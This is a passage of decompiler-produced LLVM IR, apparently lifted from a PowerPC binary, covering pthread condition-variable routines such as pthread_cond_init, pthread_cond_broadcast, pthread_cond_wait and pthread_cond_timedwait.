  %v3_10014f60 = load i32, i32* %v2_10014f60, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_10014f60, i32* %v1_10014f7c29, align 4
  %v1_10014f70 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014f70 = add i32 %v1_10014f70, 8
  %v3_10014f70 = inttoptr i32 %v2_10014f70 to i32*
  store i32 0, i32* %v3_10014f70, align 4
  %v0_10014f90.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014f90

dec_label_pc_10014f78:                            ; preds = %dec_label_pc_10014f5c
  %v1_10014f7c = inttoptr i32 %v1_10014f60 to i32*
  %v2_10014f7c = load i32, i32* %v1_10014f7c, align 4
  store i32 %v2_10014f7c, i32* %r9.global-to-local, align 4
  %v3_10014f80 = icmp eq i32 %v2_10014f7c, 0
  br i1 %v3_10014f80, label %dec_label_pc_10014f8c, label %dec_label_pc_10014f5c

dec_label_pc_10014f8c:                            ; preds = %dec_label_pc_10014f78, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014f90

dec_label_pc_10014f90:                            ; preds = %dec_label_pc_10014f60, %dec_label_pc_10014f8c
  %v0_10014f90 = phi i32 [ %v0_10014f90.pre, %dec_label_pc_10014f60 ], [ 0, %dec_label_pc_10014f8c ]
  ret i32 %v0_10014f90

; uselistorder directives
  uselistorder i32 %v2_10014f7c, { 2, 3, 0, 1 }
  uselistorder i32* %v1_10014f7c, { 1, 0 }
  uselistorder i32 %v1_10014f60, { 1, 0 }
  uselistorder i32 %v2_10014f7c22, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10014f90, { 1, 0 }
  uselistorder label %dec_label_pc_10014f5c, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10014f9c = add i32 %tmp, 8
  %v3_10014f9c = inttoptr i32 %v2_10014f9c to i32*
  store i32 0, i32* %v3_10014f9c, align 4
  %v0_10014fa0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10014fa0, i32* %arg1, align 4
  %v2_10014fa4 = add i32 %tmp, 4
  %v3_10014fa4 = inttoptr i32 %v2_10014fa4 to i32*
  store i32 %v0_10014fa0, i32* %v3_10014fa4, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10014fb0 = add i32 %arg1, 8
  %v2_10014fb0 = inttoptr i32 %v1_10014fb0 to i32*
  %v3_10014fb0 = load i32, i32* %v2_10014fb0, align 4
  %v2_10014fb4 = icmp ne i32 %v3_10014fb0, 0
  %v1_10014fbc = select i1 %v2_10014fb4, i32 16, i32 0
  ret i32 %v1_10014fbc
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10014fe4 = icmp eq i32 %arg1, 0
  %v2_10014fe4 = icmp ugt i32 %arg1, 1
  %v0_10014ff4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10014fe4, i32 %v0_10014ff4)
  %v1_10014ffc = select i1 %v1_10014fe4, i32 0, i32 38
  ret i32 %v1_10014ffc
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10015004 = call i32 @__asm_mfcr()
  store i32 %v0_10015004, i32* %r3.global-to-local, align 4
  %v3_10015008 = icmp eq i32 %arg2, 0
  store i1 %v3_10015008, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10015004, i32* @r31, align 4
  store i32 %v0_10015004, i32* @r4, align 4
  br i1 %v3_10015008, label %dec_label_pc_10015048, label %dec_label_pc_10015030

dec_label_pc_10015030:                            ; preds = %entry
  %v1_10015030 = add i32 %v0_10015004, 64
  %v2_10015030 = inttoptr i32 %v1_10015030 to i8*
  %v3_10015030 = load i8, i8* %v2_10015030, align 1
  %v3_10015034 = icmp eq i8 %v3_10015030, 0
  br i1 %v3_10015034, label %dec_label_pc_10015048.thread, label %dec_label_pc_10015058

dec_label_pc_10015048.thread:                     ; preds = %dec_label_pc_10015030
  %v2_100150484 = add i32 %v0_10015004, 444
  %v3_100150485 = inttoptr i32 %v2_100150484 to i32*
  store i32 %arg2, i32* %v3_100150485, align 4
  br label %dec_label_pc_10015058

dec_label_pc_10015048:                            ; preds = %entry
  %v1_10015040 = add i32 %v0_10015004, 28
  %v2_10015040 = inttoptr i32 %v1_10015040 to i32*
  %v3_10015040 = load i32, i32* %v2_10015040, align 4
  store i32 %v3_10015040, i32* @r3, align 4
  store i32 268521544, i32* @lr, align 4
  %v0_10015044 = call i32 @__pthread_lock()
  store i32 %v0_10015044, i32* %r3.global-to-local, align 4
  %v0_10015048.pre = load i32, i32* @r30, align 4
  %v1_10015048.pre = load i32, i32* @r31, align 4
  %v0_1001504c.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10015048 = add i32 %v1_10015048.pre, 444
  %v3_10015048 = inttoptr i32 %v2_10015048 to i32*
  store i32 %v0_10015048.pre, i32* %v3_10015048, align 4
  br i1 %v0_1001504c.pre, label %dec_label_pc_10015050, label %dec_label_pc_10015058

dec_label_pc_10015050:                            ; preds = %dec_label_pc_10015048
  %v0_10015050 = load i32, i32* @r31, align 4
  %v1_10015050 = add i32 %v0_10015050, 28
  %v2_10015050 = inttoptr i32 %v1_10015050 to i32*
  %v3_10015050 = load i32, i32* %v2_10015050, align 4
  store i32 %v3_10015050, i32* @r3, align 4
  store i32 268521560, i32* @lr, align 4
  %v0_10015054 = call i32 @__pthread_unlock()
  store i32 %v0_10015054, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015058

dec_label_pc_10015058:                            ; preds = %dec_label_pc_10015048.thread, %dec_label_pc_10015048, %dec_label_pc_10015030, %dec_label_pc_10015050
  %v1_10015068 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10015004)
  %v9_10015068 = extractvalue %0 %v1_10015068, 7
  store i4 %v9_10015068, i4* @cr4, align 1
  %v0_10015070 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10015070

; uselistorder directives
  uselistorder i32 %v0_10015004, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10015058, { 3, 1, 0, 2 }
}

define i32 @restart(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268521604, i32* @lr, align 4
  %v0_10015080 = call i32 @__pthread_restart_new()
  ret i32 %v0_10015080
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100150b0.1040 to i32), i32* @lr, align 4
  %v0_100150ac = call i32 @__pthread_lock()
  %v0_100150b4 = load i32, i32* @r29, align 4
  %v1_100150b4 = add i32 %v0_100150b4, 8
  %v2_100150b4 = inttoptr i32 %v1_100150b4 to i32*
  %v3_100150b4 = load i32, i32* %v2_100150b4, align 4
  store i32 %v3_100150b4, i32* @r31, align 4
  store i32 0, i32* %v2_100150b4, align 4
  %v0_100150bc = load i32, i32* @r29, align 4
  store i32 %v0_100150bc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100150c4.1041 to i32), i32* @lr, align 4
  %v0_100150c0 = call i32 @__pthread_unlock()
  %v0_100150ec1 = load i32, i32* @r31, align 4
  %v3_100150ec4 = icmp eq i32 %v0_100150ec1, 0
  br i1 %v3_100150ec4, label %dec_label_pc_100150f4, label %dec_label_pc_100150c8

dec_label_pc_100150c8:                            ; preds = %entry, %dec_label_pc_100150c8
  %v0_100150cc = phi i32 [ %v0_100150ec, %dec_label_pc_100150c8 ], [ %v0_100150ec1, %entry ]
  %v1_100150cc = add i32 %v0_100150cc, 8
  %v2_100150cc = inttoptr i32 %v1_100150cc to i32*
  %v3_100150cc = load i32, i32* %v2_100150cc, align 4
  store i32 %v3_100150cc, i32* @r29, align 4
  %v3_100150d0 = add i32 %v0_100150cc, 441
  %v4_100150d0 = inttoptr i32 %v3_100150d0 to i8*
  store i8 1, i8* %v4_100150d0, align 1
  %v1_100150d8 = load i32, i32* @r31, align 4
  %v2_100150d8 = add i32 %v1_100150d8, 8
  %v3_100150d8 = inttoptr i32 %v2_100150d8 to i32*
  store i32 0, i32* %v3_100150d8, align 4
  %v0_100150e0 = load i32, i32* @r31, align 4
  store i32 %v0_100150e0, i32* @r3, align 4
  %v0_100150e4 = load i32, i32* @r29, align 4
  store i32 %v0_100150e4, i32* @r31, align 4
  store i32 268521708, i32* @lr, align 4
  %v1_100150e8 = call i32 @restart(i32 %v0_100150e0)
  %v0_100150ec = load i32, i32* @r31, align 4
  %v3_100150ec = icmp eq i32 %v0_100150ec, 0
  br i1 %v3_100150ec, label %dec_label_pc_100150f4, label %dec_label_pc_100150c8

dec_label_pc_100150f4:                            ; preds = %dec_label_pc_100150c8, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100150ec, { 1, 0 }
  uselistorder i32 %v0_100150cc, { 1, 0 }
  uselistorder label %dec_label_pc_100150c8, { 1, 0 }
}

define i32 @suspend.1(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268521756, i32* @lr, align 4
  %v0_10015118 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10015118
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg3, i32* @r27, align 4
  %v1_10015148 = add i32 %arg2, 12
  %v2_10015148 = inttoptr i32 %v1_10015148 to i32*
  %v3_10015148 = load i32, i32* %v2_10015148, align 4
  %v0_1001514c = load i32, i32* @r2, align 4
  %v3_10015150 = icmp eq i32 %v3_10015148, 3
  br i1 %v3_10015150, label %dec_label_pc_10015174, label %dec_label_pc_10015158

dec_label_pc_10015158:                            ; preds = %entry
  %v3_10015158 = icmp eq i32 %v3_10015148, 0
  br i1 %v3_10015158, label %dec_label_pc_10015174, label %dec_label_pc_10015160

dec_label_pc_10015160:                            ; preds = %dec_label_pc_10015158
  %v1_10015168 = add i32 %arg2, 8
  %v2_10015168 = inttoptr i32 %v1_10015168 to i32*
  %v3_10015168 = load i32, i32* %v2_10015168, align 4
  %v4_1001516c = icmp eq i32 %v3_10015168, %v0_1001514c
  br i1 %v4_1001516c, label %dec_label_pc_10015174, label %dec_label_pc_1001530c

dec_label_pc_10015174:                            ; preds = %dec_label_pc_10015160, %dec_label_pc_10015158, %entry
  store i32 %v0_1001514c, i32* @r11, align 4
  %v2_10015188 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_10015190 = add i32 %v0_1001514c, 441
  %v4_10015190 = inttoptr i32 %v3_10015190 to i8*
  store i8 0, i8* %v4_10015190, align 1
  store i32 268521884, i32* @lr, align 4
  %v2_10015198 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001514c, i32 %v2_10015188)
  %v0_1001519c = load i32, i32* @r31, align 4
  store i32 %v0_1001519c, i32* @r3, align 4
  store i32 %v0_1001514c, i32* @r4, align 4
  store i32 268521896, i32* @lr, align 4
  %v0_100151a4 = call i32 @__pthread_lock()
  store i32 %v0_1001514c, i32* @r9, align 4
  %v1_100151ac = add i32 %v0_1001514c, 66
  %v2_100151ac = inttoptr i32 %v1_100151ac to i8*
  %v3_100151ac = load i8, i8* %v2_100151ac, align 1
  %v3_100151b0 = icmp eq i8 %v3_100151ac, 0
  br i1 %v3_100151b0, label %dec_label_pc_100151cc, label %dec_label_pc_100151b8

dec_label_pc_100151b8:                            ; preds = %dec_label_pc_10015174
  store i32 %v0_1001514c, i32* @r9, align 4
  store i32 1, i32* @r29, align 4
  %v1_100151c0 = add i32 %v0_1001514c, 64
  %v2_100151c0 = inttoptr i32 %v1_100151c0 to i8*
  %v3_100151c0 = load i8, i8* %v2_100151c0, align 1
  %v3_100151c4 = icmp eq i8 %v3_100151c0, 0
  br i1 %v3_100151c4, label %dec_label_pc_100151dc, label %dec_label_pc_100151cc

dec_label_pc_100151cc:                            ; preds = %dec_label_pc_100151b8, %dec_label_pc_10015174
  %v0_100151d0 = load i32, i32* @r31, align 4
  %v1_100151d0 = add i32 %v0_100151d0, 8
  store i32 0, i32* @r29, align 4
  %v2_100151d8 = call i32 @enqueue(i32 %v1_100151d0, i32 %v0_1001514c)
  br label %dec_label_pc_100151dc

dec_label_pc_100151dc:                            ; preds = %dec_label_pc_100151b8, %dec_label_pc_100151cc
  %v0_100151dc = load i32, i32* @r31, align 4
  store i32 %v0_100151dc, i32* @r3, align 4
  store i32 268521956, i32* @lr, align 4
  %v0_100151e0 = call i32 @__pthread_unlock()
  %v0_100151e4 = load i32, i32* @r29, align 4
  %v3_100151e4 = icmp eq i32 %v0_100151e4, 0
  br i1 %v3_100151e4, label %dec_label_pc_100151fc, label %dec_label_pc_100151ec

dec_label_pc_100151ec:                            ; preds = %dec_label_pc_100151dc
  store i32 ptrtoint (i32* @global_var_100151f8.1042 to i32), i32* @lr, align 4
  %v2_100151f4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001514c, i32 0)
  br label %dec_label_pc_100152c4

dec_label_pc_100151fc:                            ; preds = %dec_label_pc_100151dc
  %v0_100151fc = load i32, i32* @r30, align 4
  store i32 %v0_100151fc, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  store i32 268521992, i32* @lr, align 4
  %v0_10015204 = call i32 @pthread_mutex_unlock()
  %v1_10015264 = add i32 %v0_1001514c, 440
  %v2_10015264 = inttoptr i32 %v1_10015264 to i8*
  %v1_10015274 = add i32 %v0_1001514c, 64
  %v2_10015274 = inttoptr i32 %v1_10015274 to i8*
  br label %dec_label_pc_10015208

dec_label_pc_10015208:                            ; preds = %dec_label_pc_10015280, %dec_label_pc_100151fc
  %v0_1001520c = load i32, i32* @r27, align 4
  store i32 268522004, i32* @lr, align 4
  %v2_10015210 = inttoptr i32 %v0_1001520c to i32*
  %v3_10015210 = call i32 @__pthread_timedsuspend_new(i32 %v0_1001514c, i32* %v2_10015210)
  %v3_10015214 = icmp eq i32 %v3_10015210, 0
  br i1 %v3_10015214, label %dec_label_pc_1001521c, label %dec_label_pc_10015250

dec_label_pc_1001521c:                            ; preds = %dec_label_pc_10015208
  store i32 %v0_1001514c, i32* @r4, align 4
  %v0_10015220 = load i32, i32* @r31, align 4
  store i32 %v0_10015220, i32* @r3, align 4
  store i32 268522024, i32* @lr, align 4
  %v0_10015224 = call i32 @__pthread_lock()
  %v0_10015228 = load i32, i32* @r31, align 4
  %v1_10015228 = add i32 %v0_10015228, 8
  store i32 %v1_10015228, i32* @r3, align 4
  %v2_10015230 = call i32 @remove_from_queue(i32 %v1_10015228, i32 %v0_1001514c)
  %v0_10015238 = load i32, i32* @r31, align 4
  store i32 %v0_10015238, i32* @r3, align 4
  store i32 268522048, i32* @lr, align 4
  %v0_1001523c = call i32 @__pthread_unlock()
  %v3_10015240 = icmp eq i32 %v2_10015230, 0
  br i1 %v3_10015240, label %dec_label_pc_10015248, label %dec_label_pc_100152d0

dec_label_pc_10015248:                            ; preds = %dec_label_pc_1001521c
  store i32 %v0_1001514c, i32* @r3, align 4
  store i32 268522064, i32* @lr, align 4
  %v1_1001524c = call i32 @suspend.1(i32 %v0_1001514c)
  br label %dec_label_pc_10015250

dec_label_pc_10015250:                            ; preds = %dec_label_pc_10015208, %dec_label_pc_10015248
  %v3_10015254 = load i8, i8* %v4_10015190, align 1
  %v3_10015258 = icmp eq i8 %v3_10015254, 0
  br i1 %v3_10015258, label %dec_label_pc_10015260, label %dec_label_pc_10015288

dec_label_pc_10015260:                            ; preds = %dec_label_pc_10015250
  %v3_10015264 = load i8, i8* %v2_10015264, align 1
  %v3_10015268 = icmp eq i8 %v3_10015264, 0
  br i1 %v3_10015268, label %dec_label_pc_10015280, label %dec_label_pc_10015270

dec_label_pc_10015270:                            ; preds = %dec_label_pc_10015260
  %v3_10015274 = load i8, i8* %v2_10015274, align 1
  %v3_10015278 = icmp eq i8 %v3_10015274, 0
  br i1 %v3_10015278, label %dec_label_pc_10015288, label %dec_label_pc_10015280

dec_label_pc_10015280:                            ; preds = %dec_label_pc_10015270, %dec_label_pc_10015260
  %v0_10015280 = load i32, i32* @r28, align 4
  %v1_10015280 = add i32 %v0_10015280, 1
  store i32 %v1_10015280, i32* @r28, align 4
  br label %dec_label_pc_10015208

dec_label_pc_10015288:                            ; preds = %dec_label_pc_10015250, %dec_label_pc_10015270
  store i32 268522132, i32* @lr, align 4
  %v2_10015290 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001514c, i32 0)
  %v3_10015298 = load i8, i8* %v2_10015264, align 1
  %v3_1001529c = icmp eq i8 %v3_10015298, 0
  br i1 %v3_1001529c, label %dec_label_pc_100152f4.preheader, label %dec_label_pc_100152a4

dec_label_pc_100152a4:                            ; preds = %dec_label_pc_10015288
  %v3_100152a8 = load i8, i8* %v2_10015274, align 1
  %v3_100152ac = icmp eq i8 %v3_100152a8, 0
  br i1 %v3_100152ac, label %dec_label_pc_100152b4, label %dec_label_pc_100152f4.preheader

dec_label_pc_100152f4.preheader:                  ; preds = %dec_label_pc_10015288, %dec_label_pc_100152a4
  %v0_100152f41 = load i32, i32* @r28, align 4
  %v3_100152f44 = icmp eq i32 %v0_100152f41, 0
  %v1_100152f86 = add i32 %v0_100152f41, -1
  store i32 %v1_100152f86, i32* %r28.global-to-local, align 4
  br i1 %v3_100152f44, label %dec_label_pc_10015300, label %dec_label_pc_100152ec

dec_label_pc_100152b4:                            ; preds = %dec_label_pc_100152a4
  %v0_100152b8 = load i32, i32* @r30, align 4
  store i8 0, i8* %v2_10015264, align 1
  store i32 268522180, i32* @lr, align 4
  %v1_100152c0 = call i32 @pthread_mutex_lock(i32 %v0_100152b8)
  br label %dec_label_pc_100152c4

dec_label_pc_100152c4:                            ; preds = %dec_label_pc_100151ec, %dec_label_pc_100152b4
  %v0_100152cc = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100152d0

dec_label_pc_100152d0:                            ; preds = %dec_label_pc_1001521c, %dec_label_pc_100152c4
  store i32 268522204, i32* @lr, align 4
  %v2_100152d8 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001514c, i32 0)
  %v0_100152dc = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100152e4.1043 to i32), i32* @lr, align 4
  %v1_100152e0 = call i32 @pthread_mutex_lock(i32 %v0_100152dc)
  br label %dec_label_pc_1001530c

dec_label_pc_100152ec:                            ; preds = %dec_label_pc_100152f4.preheader, %dec_label_pc_100152ec
  store i32 %v0_1001514c, i32* @r3, align 4
  store i32 268522228, i32* @lr, align 4
  %v1_100152f0 = call i32 @restart(i32 %v0_1001514c)
  %v0_100152f4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100152f4 = icmp eq i32 %v0_100152f4, 0
  %v1_100152f8 = add i32 %v0_100152f4, -1
  store i32 %v1_100152f8, i32* %r28.global-to-local, align 4
  br i1 %v3_100152f4, label %dec_label_pc_10015300, label %dec_label_pc_100152ec

dec_label_pc_10015300:                            ; preds = %dec_label_pc_100152ec, %dec_label_pc_100152f4.preheader
  %v0_10015300 = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10015308.1044 to i32), i32* @lr, align 4
  %v1_10015304 = call i32 @pthread_mutex_lock(i32 %v0_10015300)
  br label %dec_label_pc_1001530c

dec_label_pc_1001530c:                            ; preds = %dec_label_pc_10015160, %dec_label_pc_100152d0, %dec_label_pc_10015300
  %v0_1001531c = phi i32 [ 22, %dec_label_pc_10015160 ], [ 110, %dec_label_pc_100152d0 ], [ 0, %dec_label_pc_10015300 ]
  ret i32 %v0_1001531c

; uselistorder directives
  uselistorder i8* %v2_10015264, { 1, 0, 2 }
  uselistorder i32 %v0_1001514c, { 7, 6, 5, 8, 12, 11, 13, 14, 15, 9, 10, 4, 16, 3, 2, 18, 17, 19, 20, 0, 21, 1 }
  uselistorder label %dec_label_pc_1001530c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100152ec, { 1, 0 }
  uselistorder label %dec_label_pc_100152d0, { 1, 0 }
  uselistorder label %dec_label_pc_100152c4, { 1, 0 }
  uselistorder label %dec_label_pc_100152f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10015288, { 1, 0 }
  uselistorder label %dec_label_pc_10015250, { 1, 0 }
  uselistorder label %dec_label_pc_100151dc, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10015338 = add i32 %arg2, 12
  %v2_10015338 = inttoptr i32 %v1_10015338 to i32*
  %v3_10015338 = load i32, i32* %v2_10015338, align 4
  %v0_1001533c = load i32, i32* @r2, align 4
  %v3_10015340 = icmp eq i32 %v3_10015338, 3
  br i1 %v3_10015340, label %dec_label_pc_10015364, label %dec_label_pc_10015348

dec_label_pc_10015348:                            ; preds = %entry
  %v3_10015348 = icmp eq i32 %v3_10015338, 0
  br i1 %v3_10015348, label %dec_label_pc_10015364, label %dec_label_pc_10015350

dec_label_pc_10015350:                            ; preds = %dec_label_pc_10015348
  %v1_10015358 = add i32 %arg2, 8
  %v2_10015358 = inttoptr i32 %v1_10015358 to i32*
  %v3_10015358 = load i32, i32* %v2_10015358, align 4
  %v4_1001535c = icmp eq i32 %v3_10015358, %v0_1001533c
  br i1 %v4_1001535c, label %dec_label_pc_10015364, label %dec_label_pc_100154a0

dec_label_pc_10015364:                            ; preds = %dec_label_pc_10015350, %dec_label_pc_10015348, %entry
  store i32 %v0_1001533c, i32* @r11, align 4
  %v2_10015378 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_10015380 = add i32 %v0_1001533c, 441
  %v4_10015380 = inttoptr i32 %v3_10015380 to i8*
  store i8 0, i8* %v4_10015380, align 1
  store i32 268522380, i32* @lr, align 4
  %v2_10015388 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001533c, i32 %v2_10015378)
  %v0_1001538c = load i32, i32* @r31, align 4
  store i32 %v0_1001538c, i32* @r3, align 4
  store i32 %v0_1001533c, i32* @r4, align 4
  store i32 268522392, i32* @lr, align 4
  %v0_10015394 = call i32 @__pthread_lock()
  store i32 %v0_1001533c, i32* @r9, align 4
  %v1_1001539c = add i32 %v0_1001533c, 66
  %v2_1001539c = inttoptr i32 %v1_1001539c to i8*
  %v3_1001539c = load i8, i8* %v2_1001539c, align 1
  %v3_100153a0 = icmp eq i8 %v3_1001539c, 0
  br i1 %v3_100153a0, label %dec_label_pc_100153bc, label %dec_label_pc_100153a8

dec_label_pc_100153a8:                            ; preds = %dec_label_pc_10015364
  store i32 %v0_1001533c, i32* @r9, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_100153b0 = add i32 %v0_1001533c, 64
  %v2_100153b0 = inttoptr i32 %v1_100153b0 to i8*
  %v3_100153b0 = load i8, i8* %v2_100153b0, align 1
  %v3_100153b4 = icmp eq i8 %v3_100153b0, 0
  br i1 %v3_100153b4, label %dec_label_pc_100153cc, label %dec_label_pc_100153bc

dec_label_pc_100153bc:                            ; preds = %dec_label_pc_100153a8, %dec_label_pc_10015364
  %v0_100153c0 = load i32, i32* @r31, align 4
  %v1_100153c0 = add i32 %v0_100153c0, 8
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_100153c8 = call i32 @enqueue(i32 %v1_100153c0, i32 %v0_1001533c)
  br label %dec_label_pc_100153cc

dec_label_pc_100153cc:                            ; preds = %dec_label_pc_100153a8, %dec_label_pc_100153bc
  %v0_100153cc = load i32, i32* @r31, align 4
  store i32 %v0_100153cc, i32* @r3, align 4
  store i32 268522452, i32* @lr, align 4
  %v0_100153d0 = call i32 @__pthread_unlock()
  %v0_100153d4 = load i32, i32* %r30.global-to-local, align 4
  %v3_100153d4 = icmp eq i32 %v0_100153d4, 0
  br i1 %v3_100153d4, label %dec_label_pc_100153ec, label %dec_label_pc_100153dc

dec_label_pc_100153dc:                            ; preds = %dec_label_pc_100153cc
  store i32 ptrtoint (i32* @global_var_100153e8.1045 to i32), i32* @lr, align 4
  %v2_100153e4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001533c, i32 0)
  br label %dec_label_pc_10015474

dec_label_pc_100153ec:                            ; preds = %dec_label_pc_100153cc
  %v0_100153ec = load i32, i32* @r29, align 4
  store i32 %v0_100153ec, i32* @r3, align 4
  store i32 268522488, i32* @lr, align 4
  %v0_100153f4 = call i32 @pthread_mutex_unlock()
  %v1_10015414 = add i32 %v0_1001533c, 440
  %v2_10015414 = inttoptr i32 %v1_10015414 to i8*
  %v1_10015424 = add i32 %v0_1001533c, 64
  %v2_10015424 = inttoptr i32 %v1_10015424 to i8*
  store i32 %v0_1001533c, i32* @r3, align 4
  store i32 268522496, i32* @lr, align 4
  %v1_100153fc7 = call i32 @suspend.1(i32 %v0_1001533c)
  %v3_100154048 = load i8, i8* %v4_10015380, align 1
  %v3_1001540811 = icmp eq i8 %v3_100154048, 0
  br i1 %v3_1001540811, label %dec_label_pc_10015410, label %dec_label_pc_10015438

dec_label_pc_10015410:                            ; preds = %dec_label_pc_100153ec, %dec_label_pc_10015430
  %v3_10015414 = load i8, i8* %v2_10015414, align 1
  %v3_10015418 = icmp eq i8 %v3_10015414, 0
  br i1 %v3_10015418, label %dec_label_pc_10015430, label %dec_label_pc_10015420

dec_label_pc_10015420:                            ; preds = %dec_label_pc_10015410
  %v3_10015424 = load i8, i8* %v2_10015424, align 1
  %v3_10015428 = icmp eq i8 %v3_10015424, 0
  br i1 %v3_10015428, label %dec_label_pc_10015438, label %dec_label_pc_10015430

dec_label_pc_10015430:                            ; preds = %dec_label_pc_10015420, %dec_label_pc_10015410
  store i32 %v0_1001533c, i32* @r3, align 4
  store i32 268522496, i32* @lr, align 4
  %v1_100153fc = call i32 @suspend.1(i32 %v0_1001533c)
  %v3_10015404 = load i8, i8* %v4_10015380, align 1
  %v3_10015408 = icmp eq i8 %v3_10015404, 0
  br i1 %v3_10015408, label %dec_label_pc_10015410, label %dec_label_pc_10015438

dec_label_pc_10015438:                            ; preds = %dec_label_pc_10015420, %dec_label_pc_10015430, %dec_label_pc_100153ec
  store i32 268522564, i32* @lr, align 4
  %v2_10015440 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001533c, i32 0)
  %v3_10015448 = load i8, i8* %v2_10015414, align 1
  %v3_1001544c = icmp eq i8 %v3_10015448, 0
  br i1 %v3_1001544c, label %dec_label_pc_10015488, label %dec_label_pc_10015454

dec_label_pc_10015454:                            ; preds = %dec_label_pc_10015438
  %v3_10015458 = load i8, i8* %v2_10015424, align 1
  %v3_1001545c = icmp eq i8 %v3_10015458, 0
  br i1 %v3_1001545c, label %dec_label_pc_10015464, label %dec_label_pc_10015488

dec_label_pc_10015464:                            ; preds = %dec_label_pc_10015454
  %v0_10015468 = load i32, i32* @r29, align 4
  store i8 0, i8* %v2_10015414, align 1
  store i32 268522612, i32* @lr, align 4
  %v1_10015470 = call i32 @pthread_mutex_lock(i32 %v0_10015468)
  br label %dec_label_pc_10015474

dec_label_pc_10015474:                            ; preds = %dec_label_pc_100153dc, %dec_label_pc_10015464
  %v0_1001547c = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10015480

dec_label_pc_10015480:                            ; preds = %dec_label_pc_10015488, %dec_label_pc_10015474
  store i32 %v0_1001533c, i32* @r3, align 4
  store i32 268522632, i32* @lr, align 4
  %v1_10015484 = call i32 @restart(i32 %v0_1001533c)
  br label %dec_label_pc_10015488

dec_label_pc_10015488:                            ; preds = %dec_label_pc_10015454, %dec_label_pc_10015438, %dec_label_pc_10015480
  %v0_10015488 = load i32, i32* @r31, align 4
  %v3_10015488 = icmp eq i32 %v0_10015488, 0
  %v1_1001548c = add i32 %v0_10015488, -1
  store i32 %v1_1001548c, i32* @r31, align 4
  br i1 %v3_10015488, label %dec_label_pc_10015494, label %dec_label_pc_10015480

dec_label_pc_10015494:                            ; preds = %dec_label_pc_10015488
  %v0_10015494 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001549c.1046 to i32), i32* @lr, align 4
  %v1_10015498 = call i32 @pthread_mutex_lock(i32 %v0_10015494)
  br label %dec_label_pc_100154a0

dec_label_pc_100154a0:                            ; preds = %dec_label_pc_10015350, %dec_label_pc_10015494
  %v0_100154b0 = phi i32 [ 22, %dec_label_pc_10015350 ], [ 0, %dec_label_pc_10015494 ]
  ret i32 %v0_100154b0

; uselistorder directives
  uselistorder i8* %v2_10015414, { 1, 0, 2 }
  uselistorder i8* %v4_10015380, { 1, 0, 2 }
